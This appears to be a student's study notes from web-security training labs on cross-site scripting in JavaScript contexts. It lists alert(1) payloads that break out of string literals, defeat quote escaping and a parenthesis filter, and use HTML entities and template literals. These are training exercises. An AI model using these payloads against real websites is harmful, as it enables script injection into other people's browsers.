

> [!warning] Valid only in HTML
> These exploits are only valid if the javascript `<script>` is inside the HTML or HTML element that takes js like **onerror**.

---
## Exploits
1. `</script><img src=1 onerror=alert(1)>`
2. `' + alert(1) + '` or `'-alert(1)//` or `'; alert(1); let tmp ='`.
3. `\';alert(1)//`
4. `&'}, a=x=>{throw onerror=alert()},tostring=a,window+'',{a:'`
5. `&apos;-alert(1)-%26apos;`
6. `${alert(1)}`

```js
<script> var searchTerms = 'controlledValue'; </script> /*
<script> var searchTerms = 'ControlledValue'; </script>
<script> var searchTerms = 'ControlledValue'; </script>
<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=Control'}).finally(_ => window.location = '/')">Back</a>
<a id="author" href="https://abc" onclick="var tracker={track(){}};tracker.track('Controlled');">abc</a>
<script> var message = `0 search results for 'asdf'`; </script>
```


---
### lab1
#### Terminating the existing script
- The reason this works is that the **browser first performs HTML parsing to identify the page elements including blocks of script, and only later performs JavaScript parsing** to understand and execute the embedded scripts. The above payload leaves the original script broken, with an unterminated string literal. But that doesn't prevent the subsequent script being parsed and executed in the normal way.
- It is like race condition, we will execute the HTML first then the javascript.
- ==THIS IS VALID ONLY IF THE `<script>` IS INSIDE THE HTML.==
```js
//THIS SCRIPT IS INSIDE HTML DOCUMENT, OTHERWISE THIS WON'T WORK.
<script>
	var searchTerms = 'controlledValue';
</script>

_____Exploit_____
</script><img src=1 onerror=alert(1)> 

```
### lab2
#### Inject javascript code with no ' escape

```js
<script>
var searchTerms = 'ControlledValue';
</script>

____Exploit_____
'-alert(1)//   OR  '; alert(1); let tmp =' OR ' + alert(1) + '
var searchTerms = ''-alert(1)//'; 
``` 

### lab3
#### Inject javascript code with ' bypass
every `'` is converted to --> `\'`. but backslash isn't encoded. so we can use it to bypass `'` encoding.
```js
<script>
var searchTerms = 'ControlledValue';
</script>

______Exploit_______
\';alert(1)//

```

### lab4
#### WAF bypass for `()`.
- `fetch()`API only takes 2 arguments. but if we provide more than 2, javascript will take the first 2 arguments, but we can call another functions inside those args.
```js
<script>
let myVar = ()=> console.log('hello world');
function myfun(a,b){
	return a + b;
}

console.log(myfun(1,2, myVar ))
</script>
```
- `Throw` will make an exception in the page, and we can pass to it multiple expressions using comma saprated, and all item will be executed and you may define functions before and execute them at the last `throw function_defination(),function_call()`.
	- You can't use throw without return statement, so you can create functions in first arguments then make dummy return value at the end `thorw fun, 1337`
- Instead of creating functions we can use `onerror`to catch the exception.
- `x= x =>{}` this is same as `let x = (a)=>{}` which is arrow function. And we need to call it.
- We overwrite `toString` function by `toString=x`, so if we call toString we are calling `x` implementation.
- We need to call `toString` we can do this by `window+''`, window isn't string so javascript calls `toString` automaticily.
- The end of exploit is just for not breaking the syntax `{x:'`
- spaces aren't not allowed so we will use `/**/` as space.
```js 
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d5'}).finaly( => window.location = '/')">back</a>
<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId='ControlledValue'}).finaly(=>window.location= '/')">back</a>

_______Exploit_______
&'}, a=x=>{throw onerror=alert()},tostring=a,window+'',{a:'

https://0a2600780411361b804812e200bf005b.web-security-academy.net/post?postId=5&'},a=x=>{throw/**/onerror=alert,1337},toString=a,window+'',{a:'
```

### lab5
#### Making use of HTML-encoding
Use HTML5_entity encoding. Ex: `'` --> `&apos`. this is usefull to inject code in javascript in HTML context. don't pay attention to what is in `source` look at `inspect`.
```js
 <a id="author" href="https://abc" onclick="var tracker={track(){}};tracker.track('Controlled');">abc</a>

_______Exploit_______

&apos;-alert(1)-%26apos;

```

### lab6
#### Template literal 
```js
<script> var message = `0 search results for 'asdf'`; </script>

_______Exploit________

${alert(1)}
```